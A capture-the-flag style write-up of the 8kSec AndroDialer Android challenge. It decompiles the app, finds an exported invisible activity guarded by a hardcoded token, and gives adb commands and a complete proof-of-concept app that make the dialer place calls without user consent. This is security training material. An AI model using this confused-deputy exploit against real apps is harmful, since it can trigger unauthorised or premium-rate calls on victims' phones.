**Description**: AndroDialer is a powerful, feature-rich phone application designed to enhance your calling experience with advanced functionality and seamless integration.

**Link**: https://academy.8ksec.io/course/android-application-exploitation-challenges

![[8ksec-AndroDialer_1.png]]

Install the `.apk` file using **ADB**
```bash
adb install -r AndroDialer.apk
```

We can see in the settings functions some features of the app.
Take a look to the app and try use it. It's important give all the permissions to the app.
Also, **add the widget to Home Screen** and use it.
Let's inspect the **source code**, for that, we'll use **JADX**.

Looking in the `AndroidManifest.xml` file, we can notice that the *package name* is `com.eightksec.androdialer`.

There are a *couple of components*, but we just will focus on this:
```XML
<activity
    android:theme="@android:style/Theme.NoDisplay"
    android:name="com.eightksec.androdialer.CallHandlerServiceActivity"
    android:exported="true"
    android:taskAffinity=""
    android:excludeFromRecents="true">
    <intent-filter>
        <action android:name="com.eightksec.androdialer.action.PERFORM_CALL"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="tel"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="dialersec"
            android:host="call"/>
    </intent-filter>
</activity>
```

We have serious problems here, for example:

- **Exported and accessible** from external apps.

- Processes `Intent.ACTION_VIEW` with `scheme=tel:`.

- `@android:style/Theme.NoDisplay` -> Invisible activity.

- This is the **main vulnerable component** (*Confused Deputy / Privilege Re-delegation*).

We can see the
```XML
<action android:name="com.eightksec.androdialer.action.PERFORM_CALL"/>
```
action. But it is just another surface attack. We don't need this action because we have the
```XML
<data android:scheme="tel"/>
```
scheme.

Now let's take a look to **classes**. We can see a lot, but, as I mentioned, let's focus into  `CallHandlerServiceActivity` class.

Here we found an **hardcoded token**:
```java
[...]
[...]
[...]
if (str7.equals("8kd1aL3R_s3Cur3_k3Y_2023") || 
    str7.equals("8kd1aL3R-s3Cur3-k3Y-2023") || 
    AbstractC2986h.m5786a(str, "8kd1aL3R_s3Cur3_k3Y_2023") || 
    AbstractC2986h.m5786a(str, "8kd1aL3R-s3Cur3-k3Y-2023")) {
    
    if (getIntent().hasExtra("phoneNumber")) {
        str3 = getIntent().getStringExtra("phoneNumber");
[...]
[...]
[...]
```

Token: **`8kd1aL3R_s3Cur3_k3Y_2023`**

Also notice the name of *variable*: **`enterprise_auth_token`**, this sound important.
And here we can see how *scheme works*
```java
[...]
[...]
if (AbstractC2986h.m5786a(data2 != null ? data2.getScheme() : null, "tel")) {
    Uri data3 = getIntent().getData();
    if (data3 != null) {
        str3 = data3.getSchemeSpecificPart();
    }
} else {
    Uri data4 = getIntent().getData();
    if (AbstractC2986h.m5786a(data4 != null ? data4.getScheme() : null, "dialersec")) {
        Uri data5 = getIntent().getData();
        if (AbstractC2986h.m5786a(data5 != null ? data5.getHost() : null, "call")) {
            Uri data6 = getIntent().getData();
            String queryParameter = data6 != null ? data6.getQueryParameter("number") : null;
            if (queryParameter == null || queryParameter.length() == 0) {
                List<String> pathSegments3 = data != null ? data.getPathSegments() : null;
                Integer valueOf = pathSegments3 != null ? Integer.valueOf(pathSegments3.indexOf("number")) : null;
                if (valueOf != null && valueOf.intValue() >= 0 && valueOf.intValue() < pathSegments3.size() - 1) {
                    str3 = pathSegments3.get(valueOf.intValue() + 1);
                }
            } else {
                str3 = queryParameter;
            }
        }
    }
[...]
[...]
[...]
```

We have *two extras*:

- `arrayList.add(getIntent().getStringExtra("enterprise_auth_token"));`

- `str3 = getIntent().getStringExtra("phoneNumber");`

So, this seems simple, we just can test it using **ADB** and then, send the intent:
```bash
adb shell am start \
  -n com.eightksec.androdialer/.CallHandlerServiceActivity \
  -a android.intent.action.VIEW \
  --es enterprise_auth_token 8kd1aL3R_s3Cur3_k3Y_2023 \
  --es phoneNumber 13371337
```
Or, avoiding `phoneNumber` as extra:
```bash
adb shell am start \
  -n com.eightksec.androdialer/.CallHandlerServiceActivity \
  -a android.intent.action.VIEW \
  -d "tel:13371337" \
  --es enterprise_auth_token 8kd1aL3R_s3Cur3_k3Y_2023
```

If this works for you, you can now **develop the PoC application**!
### PoC
**`AndroidManifest.xml`**
```XML
<?xml version="1.0" encoding="utf-8"?>  
<manifest xmlns:android="http://schemas.android.com/apk/res/android"  
    xmlns:tools="http://schemas.android.com/tools">  
  
    <application  
        android:allowBackup="true"  
        android:label="PoCAndroDialer"  
        android:supportsRtl="true"  
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">  
        <activity android:name=".MainActivity"  
            android:exported="true">  
            <intent-filter>  
                <action android:name="android.intent.action.MAIN"/>  
                <category android:name="android.intent.category.LAUNCHER"/>  
            </intent-filter>  
        </activity>  
    </application>  
  
</manifest>
```

**`MainActivity.java`**
```java
package com.lautaro.androdialer;  
  
import android.content.Intent;  
import android.net.Uri;  
import android.os.Bundle;  
import androidx.appcompat.app.AppCompatActivity;  
  
public class MainActivity extends AppCompatActivity {  
  
    @Override  
    protected void onCreate(Bundle savedInstanceState) {  
        super.onCreate(savedInstanceState);  
  
        // Send intent  
        Intent exploit = new Intent(Intent.ACTION_VIEW);  
        exploit.setClassName(  
                "com.eightksec.androdialer",  
                "com.eightksec.androdialer.CallHandlerServiceActivity"  
        );  
        exploit.setData(Uri.parse("tel:13371337"));  
        exploit.putExtra("enterprise_auth_token", "8kd1aL3R_s3Cur3_k3Y_2023");  
  
        startActivity(exploit);  
        finish();  
    }  
  
}
```

Compile, install and then, you will notice a call to `1337-1337`

I hope you found it useful (:
